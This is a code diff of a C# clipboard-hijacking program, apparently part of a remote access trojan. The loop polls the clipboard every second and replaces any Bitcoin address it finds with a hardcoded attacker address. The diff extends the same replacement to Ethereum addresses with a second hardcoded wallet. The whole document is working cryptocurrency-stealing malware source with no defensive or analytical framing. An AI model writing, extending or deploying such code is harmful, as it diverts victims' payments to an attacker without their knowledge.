@@ -4,7 +4,7 @@
     using System.Diagnostics;
     using System.Threading;
 
-    using CryptoGetAndSet.Bitcoin;
+    using CryptoGetAndSet.Crypto;
 
     using TextCopy;
 
@@ -43,7 +43,7 @@
 
             while (IsRunning)
             {
-                Debug.WriteLine("Checking the clipboard context...", "EVENT");
+                Debug.WriteLine("Executing tick on the RAT thread...", "EVENT");
 
                 // 
                 // Retrieve the text saved in the clipboard.
@@ -57,38 +57,72 @@
                 }
 
                 // 
-                // If the clipboard does not contain our bitcoin address..
+                // If the crypto-address replacement feature is enabled...
                 // 
 
-                if (!string.Equals(ClipboardText, "3HxNb6nHFh2GgPDdCbD76tkFw5WB27hqfS"))
+                if (true)
                 {
                     // 
-                    // and the clipboard text IS a bitcoin address...
+                    // If the clipboard does not contain our bitcoin address..
                     // 
 
-                    if (BitcoinAddress.IsValid(ClipboardText))
+                    if (!string.Equals(ClipboardText, "3HxNb6nHFh2GgPDdCbD76tkFw5WB27hqfS"))
                     {
-                        Debug.WriteLine($"The clipboard contains a valid bitcoin address. (Address: {ClipboardText})", "ACTION");
-
                         // 
-                        // Set our address instead.
+                        // ..and the clipboard text IS a bitcoin address.
                         // 
 
-                        ClipboardService.SetText("3HxNb6nHFh2GgPDdCbD76tkFw5WB27hqfS");
-                        Debug.WriteLine("We've replaced the clipboard text with our bitcoin address.", "ACTION");
+                        if (BitcoinAddress.IsValid(ClipboardText))
+                        {
+                            Debug.WriteLine($"The clipboard contains a valid bitcoin address. (Address: {ClipboardText})", "ACTION");
+
+                            // 
+                            // Set our address instead.
+                            // 
+
+                            ClipboardService.SetText("3HxNb6nHFh2GgPDdCbD76tkFw5WB27hqfS");
+                            Debug.WriteLine("We've replaced the clipboard text with our bitcoin address.", "ACTION");
+                        }
+                    }
+                    else
+                    {
+                        Debug.WriteLine($"The clipboard contains OUR bitcoin address. (Address: {ClipboardText})", "LOG");
+                    }
+
+                    // 
+                    // If the clipboard does not contain our ethereum address..
+                    // 
+
+                    if (!string.Equals(ClipboardText, "0x93Efc562CC3F67bE28C609c59879f90F1cB9757a"))
+                    {
+                        // 
+                        // ..and the clipboard text IS a ethereum address.
+                        // 
+
+                        if (EthereumAddress.IsValid(ClipboardText))
+                        {
+                            Debug.WriteLine($"The clipboard contains a valid ethereum address. (Address: {ClipboardText})", "ACTION");
+
+                            // 
+                            // Set our address instead.
+                            // 
+
+                            ClipboardService.SetText("0x93Efc562CC3F67bE28C609c59879f90F1cB9757a");
+                            Debug.WriteLine("We've replaced the clipboard text with our ethereum address.", "ACTION");
+                        }
+                    }
+                    else
+                    {
+                        Debug.WriteLine($"The clipboard contains OUR ethereum address. (Address: {ClipboardText})", "LOG");
                     }
                 }
-                else
-                {
-                    Debug.WriteLine($"The clipboard contains OUR bitcoin address. (Address: {ClipboardText})", "LOG");
-                }
 
                 // 
-                // Wait 2 seconds before running again.
+                // Wait 1 second before running again.
                 // 
             
             WaitForNextLoop:
-                Thread.Sleep(2000);
+                Thread.Sleep(1000);
             }
         }
     }
